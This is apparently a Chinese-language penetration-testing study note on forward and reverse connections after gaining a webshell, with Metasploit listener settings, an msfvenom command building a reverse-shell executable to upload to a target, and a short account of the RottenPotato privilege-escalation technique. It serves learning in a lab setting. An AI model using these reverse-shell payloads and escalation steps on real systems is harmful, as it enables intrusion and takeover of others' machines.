### 连接方式

#### 正向连接

*   就是我们去访问服务器建立连接，比如我们去访问我们的php木马就是一种正向连接，但是正向连接会比较不稳定，因为如果服务器有防火墙可能会把我们拦截。

#### 反向连接

*   顾名思义，就是让服务器来访问我们，跟我们建立连接，但是需要有公网ip。
    
*   当我们拿到webshell的时候，我们可以通过上传一个木马程序，来让目标服务器连接我们，因为用的是虚拟机，所以我们用本机地址就好。
    
*   这里我们通过msf来进行监听，在kali上输入msfconsole进入指令界面。
    

```


//使用监听模块set

 payload windows/meterpreter/reverse_tcpset

 LHOST 192.168.1.103set

 LPORT 8888
```

![](../Images/76889dfdfd7751952aff3327b614ff96.png)

监听kali

*   这时候我们通过msfvenom去生成木马程序

```

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=8888 -f exe > shell.exe
```

*   最后把木马程序上传然后执行。

### 烂土豆

#### 原理

*   原文

```

1.欺骗高权限账户（SYSTEM）向我们控制的TCP端进行NTLM认证2.使用一些Windows API进行中间人攻击协商安全令牌3.冒充令牌
```

*   我的理解的话就是，类似充当一个中间人，当我们在目标服务器进行权限验证的时候，其验证过程被我们截取并且在本地进行验证，把验证成功的信息返回给服务器。
